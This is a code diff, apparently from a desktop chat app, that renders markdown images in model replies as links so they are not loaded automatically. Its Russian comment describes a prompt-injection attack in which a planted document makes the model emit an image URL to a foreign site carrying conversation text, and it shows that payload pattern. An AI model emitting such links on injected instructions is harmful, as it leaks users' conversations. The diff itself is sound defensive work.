@@ -10,6 +10,19 @@ import { openUrl } from "@tauri-apps/plugin-opener";
  */
 const md = new MarkdownIt({ breaks: true, linkify: true });
 
+/**
+ * Картинка из ответа — ссылкой, а не картинкой. Окно само загрузило бы чужой адрес,
+ * а в нём может уйти кусок переписки: документ с подложенной подсказкой просит модель
+ * вставить `![](https://чужой.сайт/?q=…)`. CSP такую загрузку тоже не пустит, но так
+ * человек хотя бы видит, что там было, и откроет в браузере сам, если захочет.
+ */
+md.renderer.rules.image = (tokens, i) => {
+  const t = tokens[i];
+  const src = md.utils.escapeHtml(String(t.attrGet("src") ?? ""));
+  const alt = md.utils.escapeHtml(t.content || "картинка");
+  return `<a href="${src}">🖼 ${alt}</a>`;
+};
+
 /** Код — отдельной карточкой с языком и кнопкой «Копировать». */
 md.renderer.rules.fence = (tokens, i) => {
   const t = tokens[i];
